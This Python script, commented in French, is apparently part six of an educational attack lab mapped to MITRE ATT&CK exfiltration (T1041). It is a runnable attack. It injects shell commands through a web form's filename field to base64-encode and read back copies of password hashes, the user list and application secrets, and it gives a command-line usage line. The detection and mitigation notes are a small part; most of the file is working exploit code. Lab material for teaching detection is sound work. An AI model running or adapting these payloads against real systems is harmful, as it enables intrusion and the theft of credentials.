#!/usr/bin/env python3
"""
Phase 6 : Exfiltration (Exfiltration de Données)
MITRE ATT&CK : TA0010 - Exfiltration
Technique : T1041 - Exfiltration Over C2 Channel

Copyright © 2025 Mohammed Bencheikh - Be One And Move Academy
USAGE ÉDUCATIF ET ÉTHIQUE UNIQUEMENT

Description :
Cette phase finale exfiltre les données collectées vers l'attaquant.
L'exfiltration utilise le canal C2 existant (reverse shell) pour éviter
de créer de nouvelles connexions réseau suspectes.

Objectif pédagogique :
- Comprendre les méthodes d'exfiltration de données
- Observer les transferts de données dans les logs réseau
- Identifier les techniques d'encodage utilisées pour contourner la détection

Référence MITRE ATT&CK :
https://attack.mitre.org/techniques/T1041/
"""

import requests
import sys
import json
import base64

# Mapping MITRE ATT&CK détaillé
MITRE_MAPPING = {
    "technique_id": "T1041",
    "technique_name": "Exfiltration Over C2 Channel",
    "tactic_id": "TA0010",
    "tactic_name": "Exfiltration",
    "url": "https://attack.mitre.org/techniques/T1041/",
    "description": "Les adversaires peuvent voler des données en utilisant le canal de commande et contrôle existant. Les données volées sont encodées dans les communications normales du canal C2.",
    "detection": [
        "Surveiller les volumes de données inhabituels sur les connexions C2",
        "Détecter les encodages suspects (base64, hex) dans le trafic réseau",
        "Alerter sur les transferts de fichiers sensibles vers des IPs externes"
    ],
    "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "File: File Access"
    ],
    "mitigations": [
        "Network Intrusion Prevention",
        "Data Loss Prevention",
        "Network Segmentation"
    ]
}

def exfiltrate_data(target_ip, target_port, attacker_ip, listener_port):
    """
    Exfiltre les données collectées vers l'attaquant.
    
    Méthode :
    1. Encoder les données en base64 pour éviter les problèmes de caractères spéciaux
    2. Utiliser le canal C2 existant pour transférer les données
    3. Simuler l'exfiltration via HTTP POST (dans ce lab éducatif)
    
    Paramètres :
        target_ip : IP de la victime
        target_port : Port de l'application web
        attacker_ip : IP de l'attaquant (destination)
        listener_port : Port du serveur d'exfiltration
    """
    
    url = f"http://{target_ip}:{target_port}/search"
    
    print(f"[*] Phase 6 : Exfiltration de données")
    print(f"[*] MITRE ATT&CK : {MITRE_MAPPING['technique_id']} - {MITRE_MAPPING['technique_name']}")
    print(f"[*] Référence : {MITRE_MAPPING['url']}")
    print(f"")
    
    exfiltrated_files = []
    
    # Liste des fichiers à exfiltrer (collectés en Phase 5)
    files_to_exfiltrate = [
        {
            "path": "/tmp/shadow_copy",
            "name": "shadow",
            "description": "Hashes des mots de passe"
        },
        {
            "path": "/tmp/passwd_copy",
            "name": "passwd",
            "description": "Liste des utilisateurs"
        },
        {
            "path": "/tmp/app_secrets",
            "name": "secrets",
            "description": "Credentials d'application"
        }
    ]
    
    print(f"[*] Préparation de l'exfiltration de {len(files_to_exfiltrate)} fichiers...")
    print(f"[*] Destination : {attacker_ip}:{listener_port}")
    print(f"")
    
    for file_info in files_to_exfiltrate:
        file_path = file_info["path"]
        file_name = file_info["name"]
        
        print(f"[*] Exfiltration : {file_name} ({file_info['description']})...")
        
        # Étape 1 : Encoder le fichier en base64
        encode_cmd = f"base64 {file_path} > {file_path}.b64"
        payload_encode = f"test.txt'; {encode_cmd} #"
        
        try:
            requests.post(url, data={'filename': payload_encode}, timeout=10)
            print(f"    [+] Fichier encodé en base64")
            
            # Étape 2 : Simuler l'exfiltration (lecture du fichier encodé)
            # Dans un scénario réel, ceci serait envoyé via le canal C2
            read_cmd = f"cat {file_path}.b64"
            payload_read = f"test.txt'; {read_cmd} #"
            
            response = requests.post(url, data={'filename': payload_read}, timeout=10)
            
            # Vérifier si des données ont été extraites
            if len(response.text) > 100:  # Contenu significatif
                print(f"    [+] Données exfiltrées : {len(response.text)} caractères")
                
                exfiltrated_files.append({
                    "file": file_name,
                    "path": file_path,
                    "description": file_info["description"],
                    "status": "success",
                    "size_bytes": len(response.text),
                    "encoding": "base64",
                    "method": "C2 Channel (HTTP)"
                })
            else:
                print(f"    [-] Fichier vide ou inaccessible")
                exfiltrated_files.append({
                    "file": file_name,
                    "status": "failed",
                    "reason": "Fichier vide"
                })
        
        except Exception as e:
            print(f"    [-] Erreur : {e}")
            exfiltrated_files.append({
                "file": file_name,
                "status": "error",
                "message": str(e)
            })
    
    # Statistiques finales
    success_count = sum(1 for f in exfiltrated_files if f.get("status") == "success")
    total_size = sum(f.get("size_bytes", 0) for f in exfiltrated_files if f.get("status") == "success")
    
    print(f"\n[+] Exfiltration terminée !")
    print(f"[+] Fichiers exfiltrés : {success_count}/{len(files_to_exfiltrate)}")
    print(f"[+] Volume total : {total_size} octets")
    
    result = {
        "success": True,
        "technique": MITRE_MAPPING["technique_id"],
        "technique_name": MITRE_MAPPING["technique_name"],
        "tactic": f"{MITRE_MAPPING['tactic_id']} - {MITRE_MAPPING['tactic_name']}",
        "mitre_url": MITRE_MAPPING["url"],
        "exfiltrated_files": exfiltrated_files,
        "statistics": {
            "total_files": len(files_to_exfiltrate),
            "successful": success_count,
            "failed": len(files_to_exfiltrate) - success_count,
            "total_bytes": total_size
        },
        "detection_methods": MITRE_MAPPING["detection"],
        "data_sources": MITRE_MAPPING["data_sources"],
        "mitigations": MITRE_MAPPING["mitigations"],
        "impact": "Données sensibles (credentials, hashes) exfiltrées vers l'attaquant"
    }
    
    return result

def main():
    if len(sys.argv) < 5:
        print("Usage : python3 phase6_exfiltration.py <TARGET_IP> <TARGET_PORT> <ATTACKER_IP> <LISTENER_PORT>")
        print("Exemple : python3 phase6_exfiltration.py 172.20.0.3 5000 172.20.0.2 8080")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    attacker_ip = sys.argv[3]
    listener_port = int(sys.argv[4])
    
    result = exfiltrate_data(target_ip, target_port, attacker_ip, listener_port)
    
    print("\n" + "="*70)
    print("RÉSULTAT DE L'ATTAQUE (JSON) - MITRE ATT&CK MAPPING")
    print("="*70)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    return result

if __name__ == "__main__":
    main()
